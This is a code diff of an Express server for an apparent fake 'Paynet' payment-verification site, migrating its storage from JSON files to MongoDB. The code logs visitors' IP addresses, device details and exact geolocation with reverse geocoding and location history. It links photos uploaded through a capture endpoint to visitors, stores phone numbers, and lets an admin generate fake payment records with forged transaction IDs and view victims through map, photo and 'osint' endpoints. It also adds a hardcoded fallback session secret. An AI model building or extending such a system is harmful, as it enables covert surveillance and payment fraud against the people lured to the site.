@@ -11,7 +11,9 @@ const path = require("path");
 const crypto = require("crypto");
 require("dotenv").config();
 const cloudinary = require("cloudinary").v2;
-
+const mongoose = require('mongoose');
+const MongoStore = require('connect-mongo');
+const { LoginAttempt, GeneratedPayment, PendingPhoto, Settings } = require('./models');
 
 // Cloudinary Configuration
 if (process.env.CLOUDINARY_URL) {
@@ -25,6 +27,12 @@ if (process.env.CLOUDINARY_URL) {
     api_secret: process.env.CLOUDINARY_API_SECRET
   });
 }
+
+// MongoDB Connection
+const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/paynet';
+mongoose.connect(MONGO_URI)
+  .then(() => console.log('✅ Connected to MongoDB'))
+  .catch(err => console.error('❌ MongoDB Connection Error:', err));
 
 // Trust proxy (required for Render, Heroku, etc.)
 app.set("trust proxy", 1);
@@ -86,50 +94,14 @@ function requireAdmin(req, res, next) {
 app.use(express.urlencoded({ extended: true, limit: "10mb" }));
 app.use(express.json({ limit: "10mb" }));
 
-
-// Configure Session Store (MemoryStore for Production/Render, FileStore for Dev)
-let sessionStore;
-if (process.env.NODE_ENV === 'production') {
-  const MemoryStore = require('express-session').MemoryStore;
-  sessionStore = new MemoryStore();
-  console.log("Using MemoryStore for sessions (Production/Render)");
-} else {
-  const FileStore = require("session-file-store")(session);
-  sessionStore = new FileStore({
-    path: path.join(__dirname, "sessions"),
-    checkPeriod: 3600,
-    retries: 0
-  });
-  console.log("Using FileStore for sessions (Development)");
-}
-
-// Ensure essential directories exist (Required for Render/Ephemeral Filesystems)
-// Crucial: Use { recursive: true } to prevent race conditions or parent directory errors
-const sessionsDir = path.join(__dirname, "sessions");
-if (!fs.existsSync(sessionsDir)) {
-  console.log("Creating sessions directory (recursive):", sessionsDir);
-  fs.mkdirSync(sessionsDir, { recursive: true });
-}
-
-const capturesDir = path.join(__dirname, "captures");
-if (!fs.existsSync(capturesDir)) {
-  console.log("Creating captures directory (recursive):", capturesDir);
-  fs.mkdirSync(capturesDir, { recursive: true });
-}
-
-const adminCapturesDir = path.join(__dirname, "admin-captures");
-if (!fs.existsSync(adminCapturesDir)) {
-  console.log("Creating admin-captures directory (recursive):", adminCapturesDir);
-  fs.mkdirSync(adminCapturesDir, { recursive: true });
-}
-
-
-
-// Session setup (secure secret from environment)
+// Configure Session Store with MongoDB
 app.use(
   session({
-    store: sessionStore,
-    secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString("hex"),
+    store: MongoStore.create({
+      mongoUrl: MONGO_URI,
+      ttl: 24 * 60 * 60 // 1 day
+    }),
+    secret: process.env.SESSION_SECRET || 'paynet_secure_secret',
     resave: false,
     saveUninitialized: false,
     cookie: {
@@ -414,119 +386,51 @@ function extractExactLocation(attempt) {
   return { lat, lon, accuracy, source, address };
 }
 
-// Load/Save Settings
-const settingsFile = path.join(__dirname, "settings.json");
-const defaultSettings = { paymentAmount: "500.00", currencySymbol: "₹", enableAnimation: true };
-
-function getSettings() {
+// Load/Save Settings (Async now)
+async function getSettings() {
   try {
-    if (fs.existsSync(settingsFile)) {
-      return JSON.parse(fs.readFileSync(settingsFile, "utf-8"));
-    }
+    const settings = await Settings.findOne({ key: 'global' });
+    if (settings) return settings.toObject();
   } catch (err) {
-    console.error("Error reading settings, using defaults:", err.message);
+    console.error("Error reading settings from DB:", err);
   }
-  return { ...defaultSettings };
+  return { paymentAmount: "500.00", currencySymbol: "₹", enableAnimation: true };
 }
 
-function saveSettings(newSettings) {
-  fs.writeFileSync(settingsFile, JSON.stringify(newSettings, null, 2));
-}
-
-// Safe JSON file reader
-function safeReadJSON(filePath, fallback = []) {
+async function saveSettings(newSettings) {
   try {
-    if (fs.existsSync(filePath)) {
-      const content = fs.readFileSync(filePath, "utf-8").trim();
-      if (content) return JSON.parse(content);
-    }
+    await Settings.findOneAndUpdate(
+      { key: 'global' },
+      { $set: newSettings },
+      { upsert: true, new: true }
+    );
   } catch (err) {
-    console.error(`Error reading ${filePath}:`, err.message);
-    const bakPath = filePath + ".bak";
-    try {
-      if (fs.existsSync(bakPath)) {
-        const bakContent = fs.readFileSync(bakPath, "utf-8").trim();
-        if (bakContent) return JSON.parse(bakContent);
-      }
-    } catch (bakErr) {
-      console.error("Backup recovery failed:", bakErr.message);
-    }
-  }
-  return fallback;
-}
-
-// Safe JSON file writer (creates backup first)
-function safeWriteJSON(filePath, data) {
-  try {
-    if (fs.existsSync(filePath)) {
-      fs.copyFileSync(filePath, filePath + ".bak");
-    }
-    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
-  } catch (err) {
-    console.error(`Error writing ${filePath}:`, err.message);
+    console.error("Error saving settings to DB:", err);
   }
 }
 
-// Mutex for safe JSON writes
-class Mutex {
-  constructor() {
-    this.queue = [];
-    this.locked = false;
-  }
-  async lock() {
-    return new Promise(resolve => {
-      if (this.locked) {
-        this.queue.push(resolve);
-      } else {
-        this.locked = true;
-        resolve();
-      }
-    });
-  }
-  unlock() {
-    if (this.queue.length > 0) {
-      const next = this.queue.shift();
-      next();
-    } else {
-      this.locked = false;
-    }
-  }
-}
 
-const dbLock = new Mutex();
-
-async function safeUpdateJSON(filepath, updateFn) {
-  await dbLock.lock();
-  try {
-    const data = safeReadJSON(filepath, []);
-    const newData = updateFn(data);
-    safeWriteJSON(filepath, newData);
-    return newData;
-  } finally {
-    dbLock.unlock();
-  }
-}
 
 // ============ ROUTES ============
 
-app.get("/", (req, res) => {
-  res.render("payment", { ...getSettings(), layout: false });
+app.get("/", async (req, res) => {
+  res.render("payment", { ...await getSettings(), layout: false });
 });
 
 app.get("/login", (req, res) => {
   res.render("login", { layout: false });
 });
 
-app.get("/payment", (req, res) => {
-  res.render("payment", { ...getSettings(), layout: false });
+app.get("/payment", async (req, res) => {
+  res.render("payment", { ...await getSettings(), layout: false });
 });
 
-app.get("/verify", (req, res) => {
-  res.render("verify", { ...getSettings(), layout: false });
+app.get("/verify", async (req, res) => {
+  res.render("verify", { ...await getSettings(), layout: false });
 });
 
 // Validate Payment ID
-app.post("/validate-payment-id", (req, res) => {
+app.post("/validate-payment-id", async (req, res) => {
   const { paymentId } = req.body;
 
   if (!paymentId || paymentId.length < 6) {
@@ -536,34 +440,38 @@ app.post("/validate-payment-id", (req, res) => {
     });
   }
 
-  const paymentsFile = path.join(__dirname, "generatedPayments.json");
-  const payments = safeReadJSON(paymentsFile, []);
-  const payment = payments.find(p => p.id === paymentId);
-
-  if (payment) {
-    return res.json({
-      valid: true,
-      payment: { ...payment, isCustom: true }
-    });
-  }
-
-  res.json({
-    valid: true,
-    payment: {
-      id: paymentId,
-      amount: getSettings().paymentAmount || "500.00",
-      merchant: "Paynet Services",
-      date: new Date().toLocaleString('en-IN', {
-        day: '2-digit', month: 'short', year: 'numeric',
-        hour: '2-digit', minute: '2-digit', hour12: true
-      }),
-      isCustom: false
+  try {
+    const payment = await GeneratedPayment.findOne({ id: paymentId }).lean();
+    if (payment) {
+      return res.json({
+        valid: true,
+        payment: { ...payment, isCustom: true }
+      });
     }
-  });
+
+    const settings = await getSettings();
+    res.json({
+      valid: true,
+      payment: {
+        id: paymentId,
+        amount: settings.paymentAmount || "500.00",
+        merchant: "Paynet Services",
+        date: new Date().toLocaleString('en-IN', {
+          day: '2-digit', month: 'short', year: 'numeric',
+          hour: '2-digit', minute: '2-digit', hour12: true
+        }),
+        isCustom: false
+      }
+    });
+
+  } catch (err) {
+    console.error("Payment validation error:", err);
+    res.status(500).json({ valid: false, message: "Validation service temporarily unavailable" });
+  }
 });
 
 // Admin API: Generate payment
-app.post("/admin/api/generate-payment", requireAdmin, (req, res) => {
+app.post("/admin/api/generate-payment", requireAdmin, async (req, res) => {
   try {
     const { amount, toName, fromName, bankName, upiId, upiTxnId, googleTxnId, customDate } = req.body;
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -572,19 +480,16 @@ app.post("/admin/api/generate-payment", requireAdmin, (req, res) => {
       id += chars.charAt(Math.floor(Math.random() * chars.length));
     }
 
-    const newPayment = {
+    const newPayment = new GeneratedPayment({
       id, amount, toName, fromName, bankName, upiId, upiTxnId, googleTxnId,
       date: customDate || new Date().toLocaleString('en-IN', {
         day: '2-digit', month: 'short', year: 'numeric',
         hour: '2-digit', minute: '2-digit', hour12: true
       }),
-      createdAt: new Date().toISOString()
-    };
+      createdAt: new Date()
+    });
 
-    const paymentsFile = path.join(__dirname, "generatedPayments.json");
-    let payments = safeReadJSON(paymentsFile, []);
-    payments.push(newPayment);
-    safeWriteJSON(paymentsFile, payments);
+    await newPayment.save();
 
     res.json({ success: true, payment: newPayment });
   } catch (error) {
@@ -594,14 +499,14 @@ app.post("/admin/api/generate-payment", requireAdmin, (req, res) => {
 });
 
 // Admin API: Settings
-app.post("/admin/api/settings", requireAdmin, (req, res) => {
+app.post("/admin/api/settings", requireAdmin, async (req, res) => {
   const { paymentAmount, currencySymbol, enableAnimation } = req.body;
   const newSettings = {
     paymentAmount,
     currencySymbol,
     enableAnimation: enableAnimation === 'on' || enableAnimation === true
   };
-  saveSettings(newSettings);
+  await saveSettings(newSettings);
   res.redirect("/admin");
 });
 
@@ -839,16 +744,24 @@ app.post('/admin/api/intel/osint', requireAdmin, async (req, res) => {
 });
 
 // Admin Dashboard
-app.get("/admin", requireAdmin, (req, res) => {
-  const settings = getSettings();
-  const logFile = path.join(__dirname, "loginAttempts.json");
-  let attempts = safeReadJSON(logFile, []);
+app.get("/admin", requireAdmin, async (req, res) => {
+  try {
+    const settings = await getSettings();
+    // Get latest 50 attempts for initial load
+    const attempts = await LoginAttempt.find()
+      .sort({ timestamp: -1 })
+      .limit(50)
+      .lean();
 
-  res.render("admin", {
-    attempts: attempts.reverse(),
-    settings: settings,
-    layout: false
-  });
+    res.render("admin", {
+      attempts: attempts, // Already sorted
+      settings: settings,
+      layout: false
+    });
+  } catch (err) {
+    console.error("Admin dashboard error:", err);
+    res.status(500).send("Database Error");
+  }
 });
 
 app.get("/admin-login", (req, res) => {
@@ -871,15 +784,13 @@ app.post("/admin-auth", (req, res) => {
 
 // ============ ADMIN DATA API ============
 // Returns all attempts with pre-extracted exact location data
-app.get("/admin/api/data", requireAdmin, (req, res) => {
+// ============ ADMIN DATA API ============
+app.get("/admin/api/data", requireAdmin, async (req, res) => {
   try {
-    const logFile = path.join(__dirname, "loginAttempts.json");
-    let attempts = safeReadJSON(logFile, []);
+    // 1. Fetch Attempts
+    let attempts = await LoginAttempt.find().sort({ timestamp: -1 }).lean();
 
-    // Sort by timestamp descending
-    attempts.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-
-    // PRE-EXTRACT exact location for every attempt
+    // 2. Pre-extract Exact Location
     attempts = attempts.map(attempt => {
       const exactLoc = extractExactLocation(attempt);
       return {
@@ -897,26 +808,16 @@ app.get("/admin/api/data", requireAdmin, (req, res) => {
       };
     });
 
-    // Get photos
-    const capturesDir = path.join(__dirname, "captures");
+    // 3. Collect Photos
     let photos = [];
-    if (fs.existsSync(capturesDir)) {
-      const files = fs.readdirSync(capturesDir);
-      photos = files.filter(f => /\.(jpg|jpeg|png|webp)$/i.test(f)).map(filename => ({
-        filename,
-        path: `/admin/photo/${filename}`,
-        isLocal: true,
-        timestamp: fs.statSync(path.join(capturesDir, filename)).mtime
-      }));
-    }
 
-    // Add photos from attempts
+    // From Attempts
     attempts.forEach(attempt => {
       if (attempt.photos && Array.isArray(attempt.photos)) {
         attempt.photos.forEach(photo => {
           photos.push({
             filename: photo.filename,
-            path: photo.url || photo.localPath,
+            path: photo.url || photo.localPath || (photo.filename ? `/admin/photo/${photo.filename}` : ''),
             isLocal: !photo.url,
             type: photo.type,
             attemptId: attempt.verificationId,
@@ -935,43 +836,33 @@ app.get("/admin/api/data", requireAdmin, (req, res) => {
       }
     });
 
-    // Load pending photos
-    const photosFile = path.join(__dirname, "pendingPhotos.json");
-    const pendingPhotos = safeReadJSON(photosFile, []);
+    // From Pending Photos (Unlinked)
+    const pendingPhotos = await PendingPhoto.find().sort({ timestamp: -1 }).lean();
 
-    // Backfill: Link pending photos to attempts
-    attempts.forEach(attempt => {
-      if (attempt.verificationId) {
-        const linked = pendingPhotos.filter(p => p.paymentId === attempt.verificationId);
-        if (linked.length > 0) {
-          if (!attempt.photos) attempt.photos = [];
-          linked.forEach(lp => {
-            const exists = attempt.photos.some(existing => existing.url === lp.url || existing.filename === lp.filename);
-            if (!exists) attempt.photos.push(lp);
-          });
-        }
-      }
-    });
+    // Backfill linking logic (optional, but good for consistency)
+    // In DB model, we might not need to re-link every time if save logic is good.
+    // We just show pending photos that aren't in attempts?
+    // Actually, let's just add all pending photos to the gallery stream 
+    // effectively showing the "pool" of recent captures.
 
-    // Add pending photos to gallery
     pendingPhotos.forEach(photo => {
-      const photoPath = photo.url || photo.localPath || (photo.filename ? `/admin/photo/${photo.filename}` : null);
-      if (photoPath) {
+      // Avoid duplicates if already in an attempt?
+      // Simple check: if filename is in photos array already
+      const exists = photos.some(p => p.filename === photo.filename);
+      if (!exists) {
         photos.push({
-          filename: photo.filename || 'pending',
-          path: photoPath,
+          filename: photo.filename,
+          path: photo.url || photo.localPath || `/admin/photo/${photo.filename}`,
           isLocal: !photo.url,
           type: photo.type || 'pending',
-          attemptId: 'Pending',
+          attemptId: photo.paymentId || 'Pending', // Show generic pending if not linked
           timestamp: photo.timestamp
         });
       }
     });
 
-    // Remove duplicates and sort
-    photos = photos.filter((photo, index, self) =>
-      index === self.findIndex(p => p.path === photo.path)
-    ).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+    // Sort all photos by time
+    photos.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
 
     res.json({ attempts, photos });
   } catch (error) {
@@ -982,12 +873,10 @@ app.get("/admin/api/data", requireAdmin, (req, res) => {
 
 // ============ EXACT LOCATION API ============
 // Returns just the exact coordinates for a specific attempt
-app.get("/admin/api/location/:id", requireAdmin, (req, res) => {
+app.get("/admin/api/location/:id", requireAdmin, async (req, res) => {
   try {
     const { id } = req.params;
-    const logFile = path.join(__dirname, "loginAttempts.json");
-    const attempts = safeReadJSON(logFile, []);
-    const attempt = attempts.find(a => a.verificationId === id);
+    const attempt = await LoginAttempt.findOne({ verificationId: id }).lean();
 
     if (!attempt) {
       return res.status(404).json({ error: "Attempt not found" });
@@ -1033,6 +922,7 @@ app.delete("/admin/photo/delete/:filename", requireAdmin, async (req, res) => {
     const filepath = path.join(capturesDir, filename);
     let deleted = false;
 
+    // 1. Delete Physical File
     if (fs.existsSync(filepath)) {
       try {
         fs.unlinkSync(filepath);
@@ -1042,27 +932,26 @@ app.delete("/admin/photo/delete/:filename", requireAdmin, async (req, res) => {
       }
     }
 
-    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), (photos) => {
-      const initialLength = photos.length;
-      const newPhotos = photos.filter(p => p.filename !== filename && p.url !== filename);
-      if (newPhotos.length < initialLength) deleted = true;
-      return newPhotos;
+    // 2. Delete from Pending Photos
+    const pendingResult = await PendingPhoto.deleteMany({
+      $or: [{ filename: filename }, { url: filename }]
     });
+    if (pendingResult.deletedCount > 0) deleted = true;
 
-    await safeUpdateJSON(path.join(__dirname, "loginAttempts.json"), (attempts) => {
-      attempts.forEach(attempt => {
-        if (attempt.photos) {
-          const originalLen = attempt.photos.length;
-          attempt.photos = attempt.photos.filter(p => p.filename !== filename && p.url !== filename);
-          if (attempt.photos.length < originalLen) deleted = true;
-        }
-        if (attempt.photoFilename === filename) {
-          attempt.photoFilename = null;
-          deleted = true;
-        }
-      });
-      return attempts;
-    });
+    // 3. Remove references from Attempts
+    // Remove from photos array
+    const pullResult = await LoginAttempt.updateMany(
+      { "photos.filename": filename },
+      { $pull: { photos: { filename: filename } } }
+    );
+    if (pullResult.modifiedCount > 0) deleted = true;
+
+    // Clear single references
+    const updateResult = await LoginAttempt.updateMany(
+      { photoFilename: filename },
+      { $unset: { photoFilename: 1 } }
+    );
+    if (updateResult.modifiedCount > 0) deleted = true;
 
     res.json({ success: true, message: deleted ? "Photo and references deleted" : "Photo reference removed" });
   } catch (error) {
@@ -1079,19 +968,14 @@ app.delete("/admin/photo/delete-all", requireAdmin, async (req, res) => {
       files.forEach(file => {
         const filepath = path.join(capturesDir, file);
         if (fs.statSync(filepath).isFile()) {
-          fs.unlinkSync(filepath);
+          try { fs.unlinkSync(filepath); } catch { }
         }
       });
     }
 
-    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), () => []);
-    await safeUpdateJSON(path.join(__dirname, "loginAttempts.json"), (attempts) => {
-      attempts.forEach(a => {
-        a.photos = [];
-        a.photoFilename = null;
-        a.cloudinaryUrl = null;
-      });
-      return attempts;
+    await PendingPhoto.deleteMany({});
+    await LoginAttempt.updateMany({}, {
+      $set: { photos: [], photoFilename: null, cloudinaryUrl: null }
     });
 
     res.json({ success: true, message: "All photos deleted" });
@@ -1172,17 +1056,13 @@ app.post("/capture-photo", async (req, res) => {
       filename,
       url: photoUrl,
       type: photoType,
-      camera: cameraType,
-      ip,
-      timestamp: clientTimestamp || new Date().toISOString(),
       localPath: photoUrl ? null : `/admin/photo/${filename}`,
+      timestamp: clientTimestamp || new Date().toISOString(),
+      ip: ip,
       paymentId: paymentId || null
     };
 
-    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), (photos) => {
-      photos.push(photoMetadata);
-      return photos;
-    });
+    await new PendingPhoto(photoMetadata).save();
 
     res.json({ success: true, filename, url: photoUrl });
   } catch (error) {
@@ -1233,50 +1113,44 @@ app.post("/log-visit", async (req, res) => {
 
     const verificationId = paymentId || "VISIT-" + ip.replace(/[.:]/g, "").slice(-4) + "-" + timestamp.slice(14, 19).replace(":", "");
 
-    const logFile = path.join(__dirname, "loginAttempts.json");
-    await safeUpdateJSON(logFile, (attempts) => {
-      const existingIndex = attempts.findIndex(a => a.verificationId === verificationId);
-
-      if (existingIndex !== -1) {
-        const existing = attempts[existingIndex];
-        existing.timestamp = timestamp;
-        existing.ip = ip;
-        if (geo) existing.geo = geo;
-        if (parsedLocation) existing.location = parsedLocation;
-        if (parsedDeviceDetails) existing.deviceDetails = parsedDeviceDetails;
-
-        if (!existing.locationHistory) existing.locationHistory = [];
-        if (coords) {
-          existing.locationHistory.push({
-            coords,
-            timestamp,
-            source: (parsedLocation.finalLocation ? parsedLocation.finalLocation.source : (parsedLocation.source || 'Update'))
-          });
-          if (existing.locationHistory.length > 50) existing.locationHistory.shift();
-        }
-
-        existing.status = existing.status || "Verifying";
-        existing.lastUpdate = timestamp;
-        existing.isLive = true;
-      } else {
-        const logData = {
-          verificationId,
-          timestamp,
-          ip,
-          geo,
-          location: parsedLocation,
-          deviceDetails: parsedDeviceDetails,
-          userAgent: userAgent || req.headers["user-agent"],
-          status: "Verifying",
-          type: "Visit",
-          locationHistory: coords ? [{ coords, timestamp, source: 'Initial' }] : [],
-          isLive: true,
-          lastUpdate: timestamp
-        };
-        attempts.push(logData);
+    // Construct update object
+    const update = {
+      $set: {
+        timestamp: timestamp, // Update timestamp on every ping? Or keep original? Original updated it.
+        ip: ip,
+        lastUpdate: timestamp,
+        isLive: true,
+        status: "Verifying" // Default status
+      },
+      $setOnInsert: {
+        type: "Visit",
+        userAgent: userAgent || req.headers["user-agent"]
       }
-      return attempts;
-    });
+    };
+
+    if (geo) update.$set.geo = geo;
+    if (parsedLocation) update.$set.location = parsedLocation;
+    if (parsedDeviceDetails) update.$set.deviceDetails = parsedDeviceDetails;
+
+    if (coords) {
+      const historyEntry = {
+        coords,
+        timestamp,
+        source: (parsedLocation.finalLocation ? parsedLocation.finalLocation.source : (parsedLocation.source || 'Update'))
+      };
+      update.$push = {
+        locationHistory: {
+          $each: [historyEntry],
+          $slice: -50 // Keep last 50
+        }
+      };
+    }
+
+    await LoginAttempt.findOneAndUpdate(
+      { verificationId },
+      update,
+      { upsert: true, new: true, setDefaultsOnInsert: true }
+    );
 
     res.json({ success: true, verificationId });
   } catch (error) {
@@ -1313,7 +1187,6 @@ app.post("/verify", async (req, res) => {
 
   // Enhanced location with reverse geocoding
   let enhancedLocation = parsedLocation;
-
   const hasDirectCoords = parsedLocation && parsedLocation.latitude && parsedLocation.longitude;
   const hasFinalCoords = parsedLocation && parsedLocation.finalLocation &&
     parsedLocation.finalLocation.coords &&
@@ -1321,19 +1194,14 @@ app.post("/verify", async (req, res) => {
 
   if (hasDirectCoords) {
     const address = await reverseGeocode(parsedLocation.latitude, parsedLocation.longitude);
-    if (address) {
-      enhancedLocation = { ...parsedLocation, address };
-    }
+    if (address) enhancedLocation = { ...parsedLocation, address };
   } else if (hasFinalCoords) {
     const coords = parsedLocation.finalLocation.coords;
     const address = await reverseGeocode(coords.latitude, coords.longitude);
     if (address) {
       enhancedLocation = {
         ...parsedLocation,
-        finalLocation: {
-          ...parsedLocation.finalLocation,
-          address
-        }
+        finalLocation: { ...parsedLocation.finalLocation, address }
       };
     }
   }
@@ -1341,33 +1209,36 @@ app.post("/verify", async (req, res) => {
   const verificationId = "PAY-" + crypto.randomBytes(4).toString("hex").toUpperCase();
 
   // Link pending photos
-  const photosFile = path.join(__dirname, "pendingPhotos.json");
   let userPhotos = [];
   const normalizedIP = normalizeIP(ip);
 
-  await safeUpdateJSON(photosFile, (pendingPhotos) => {
-    const timeWindow = new Date(Date.now() - 60 * 60 * 1000).toISOString(); // Increased to 60 mins
-    const directMatches = pendingPhotos.filter(p => {
-      // Normalize IPs to handle ::ffff: prefixes
-      return normalizeIP(p.ip) === normalizedIP && p.timestamp > timeWindow;
+  try {
+    const timeWindow = new Date(Date.now() - 60 * 60 * 1000).toISOString();
+    const fallbackWindow = new Date(Date.now() - 15 * 60 * 1000).toISOString();
+
+    // Find matches in DB
+    const directMatches = await PendingPhoto.find({
+      ip: normalizedIP,
+      timestamp: { $gt: timeWindow }
     });
+
     userPhotos = [...directMatches];
 
     if (userPhotos.length === 0) {
-      // Fallback: Just time based correlation if IP mismatch (e.g. mobile network switch)
-      const fallbackWindow = new Date(Date.now() - 15 * 60 * 1000).toISOString(); // Increased to 15 mins
-      const timeMatches = pendingPhotos.filter(p => p.timestamp > fallbackWindow);
-      if (timeMatches.length > 0) {
-        userPhotos = [...timeMatches];
-      }
+      const timeMatches = await PendingPhoto.find({
+        timestamp: { $gt: fallbackWindow }
+      });
+      userPhotos = [...timeMatches];
     }
 
+    // Remove linked photos from pending pool
     if (userPhotos.length > 0) {
-      const linkedIds = new Set(userPhotos.map(p => p.timestamp));
-      return pendingPhotos.filter(p => !linkedIds.has(p.timestamp));
+      const idsToRemove = userPhotos.map(p => p._id);
+      await PendingPhoto.deleteMany({ _id: { $in: idsToRemove } });
     }
-    return pendingPhotos;
-  });
+  } catch (err) {
+    console.error("Error linking photos:", err);
+  }
 
   const logData = {
     verificationId,
@@ -1383,7 +1254,6 @@ app.post("/verify", async (req, res) => {
     phoneNumber: phoneNumber || null,
     photoData: userPhotos.length > 0 ? "[CAPTURED]" : (photoData ? "[CAPTURED]" : null),
     photos: userPhotos,
-    photoCount: userPhotos.length,
     photoFilename: req.body.photoFilename || null,
     cloudinaryUrl: req.body.photoUrl || null,
     status: "Verified",
@@ -1403,11 +1273,12 @@ app.post("/verify", async (req, res) => {
       }
     }
 
-    const logFile = path.join(__dirname, "loginAttempts.json");
-    await safeUpdateJSON(logFile, (attempts) => {
-      attempts.push(logData);
-      return attempts;
-    });
+    await new LoginAttempt(logData).save();
+
+    // Also cleanup any "Visit" entry that might have been created by log-visit for this IP/session?
+    // The verificationId here is new "PAY-...", but log-visit uses "VISIT-...".
+    // We can leave the visit separate or try to merge. The original code kept them separate.
+
   } catch (error) {
     console.error("Error in /verify log save:", error);
   }
@@ -1452,23 +1323,24 @@ process.on("unhandledRejection", (reason) => {
 const PORT = process.env.PORT || 3003;
 
 // Periodic Cleanup (Every hour)
+// Periodic Cleanup (Every hour)
 setInterval(async () => {
   try {
-    const photosFile = path.join(__dirname, "pendingPhotos.json");
-    const ONE_DAY = 24 * 60 * 60 * 1000;
+    const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
 
-    await safeUpdateJSON(photosFile, (photos) => {
-      const now = Date.now();
-      const initialCount = photos.length;
-      const newPhotos = photos.filter(p => {
-        const timeDiff = now - new Date(p.timestamp).getTime();
-        return timeDiff < ONE_DAY;
-      });
-      if (newPhotos.length < initialCount) {
-        console.log(`🧹 Cleanup: Removed ${initialCount - newPhotos.length} old pending photos`);
-      }
-      return newPhotos;
+    // Cleanup old pending photos
+    const result = await PendingPhoto.deleteMany({
+      timestamp: { $lt: twentyFourHoursAgo }
     });
+
+    if (result.deletedCount > 0) {
+      console.log(`🧹 Cleanup: Removed ${result.deletedCount} old pending photos`);
+    }
+
+    // Optional: Cleanup very old LoginAttempts?
+    // const thirtyDaysAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
+    // await LoginAttempt.deleteMany({ timestamp: { $lt: thirtyDaysAgo } });
+
   } catch (e) {
     console.error("Cleanup error:", e);
   }
